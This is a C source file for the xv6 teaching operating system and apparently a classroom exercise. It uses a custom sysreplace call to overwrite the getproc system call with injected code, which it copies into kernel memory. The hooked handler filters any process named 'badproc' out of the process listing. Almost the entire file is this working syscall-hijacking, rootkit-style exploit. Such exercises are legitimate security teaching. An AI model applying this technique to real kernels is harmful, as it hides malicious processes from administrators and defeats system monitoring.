#include"types.h"
#include"user.h"


int (*f)(void);
char* (*k)(void);
char *kernel_pointer;
int old_func_add;
int mygetproc(void);
int exploit_stage1(void);

int main(void)
{
int kalloc_add;
int n=121,i;
kalloc_add=findkalloc();
k=(void *)kalloc_add;
sysreplace(23,(int)exploit_stage1,(int)&old_func_add);
getproc(1);
//printf(1,"%d ",n);
sysreplace(23,(int)(kernel_pointer+4),(int)&old_func_add);
//,i;
 	struct procentry
        {
                int id;
                char state[10];
                char name[16];
        } q[64],*p;
	p=&q[0];
        //printf(1,"%d ",&n);
	n=getproc((int)p);
        //printf(1,"%d ",n);
         
        
	for (i=0;i<n;i++)
	{
		printf(1,"%d |  %s   |%s\n",p[i].id,p[i].state,p[i].name); 
	}

exit();
}
int mygetproc(void)
{
  __asm__ ( "call L1;"
                "L1:pop %eax;"
    );
register int x asm ("%eax");
x-=15;
int (*fpointer)(int);
fpointer=(void *)*((int *)x);
int sadd,n,i,j=0,dif,flag=0;//,flag=0;
struct procentry{
int id;
char state[10];
char name[16];
}*pe;
char check[16]="badproc";
//strcpy(check, "badproc");
 //get the arg here
__asm__ ( "push %gs:4;"
	  "pop %eax;");
register int *y asm ("%eax");
y+=6;
sadd=*(int *)(y);
sadd+=68;
sadd=*(int *)sadd;
sadd+=4;
sadd=*(int *)sadd;
n=fpointer(sadd);
pe=(struct procentry *)sadd;
for(i=0;i<n;i++)
{
while((pe+i)->name[j]!='\0'||check[j]!='\0')
   {
   dif=((pe+i)->name[j]-check[j]);
   if(dif!=0)
      break;
   j++;
   }
 if (dif==0)
  {
    flag+=1;
   j=0;
   (pe+i)->id=(pe+(n-1))->id;
   do
   {
   (pe+i)->name[j]=(pe+(n-1))->name[j];
   }while((pe+(n-1))->name[j++]!='\0');
   j=0;
   do
   {
    (pe+i)->state[j]=(pe+(n-1))->state[j];
   }while((pe+(n-1))->state[j++]!='\0');
   
  }
}
if(flag>0)
return (n-flag);
else
return n;
}
int exploit_stage1()
{
  kernel_pointer=k();
  memmove(kernel_pointer+4,(void *)mygetproc,(uint)(exploit_stage1-mygetproc));
  memmove(kernel_pointer,(void *)(&old_func_add),4);
 // f=(void *)(*(int *)kernel_pointer);
  return 1;
}

